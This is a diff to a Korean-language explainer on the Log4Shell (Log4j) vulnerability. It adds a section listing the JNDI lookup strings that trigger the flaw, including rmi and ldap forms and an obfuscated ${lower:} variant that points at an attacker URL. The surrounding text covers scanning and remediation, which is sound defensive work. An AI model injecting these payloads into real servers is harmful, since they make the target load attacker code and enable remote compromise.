@@ -109,6 +109,16 @@ Log4Shell의 취약점은 RCE취약점으로 취약점 중에서도 심각한 �
 
 -----
 
+## Trigger
+
+공격자가 HTTP Request에 `${jndi:rmi://공격자URL}`, `${jndi:ldap://공격자URL}`, `${jndi:${lower:l}${lower:d}a${lower:p}://공격자URL}` 와 같이 요청 시 트리거된다.
+
+
+
+-----
+
+
+
 ## 점검 방법(1)
 
 [참고 사이트](https://github.com/logpresso/CVE-2021-44228-Scanner)에서 서버 운영체제에 맞게 파일을 다운받는다.
@@ -166,8 +176,6 @@ Completed in 0.42 seconds
 
 
 
-
-
 -----
 
 ## 해결방법
@@ -187,7 +195,7 @@ Completed in 0.42 seconds
 
 출처: [ESTsecurity](https://blog.alyac.co.kr/4341), [KISA 침해사고분석단 취약점분석팀](https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389), [Wiki](https://ko.wikipedia.org/wiki/Log4j)
 
------
+
 
 [^1]:취약점이 알려지지 않거나, 관련 패치가 배포되지 않은 시기
 [^2]: 취약점 대응 패치가 배포된 시기
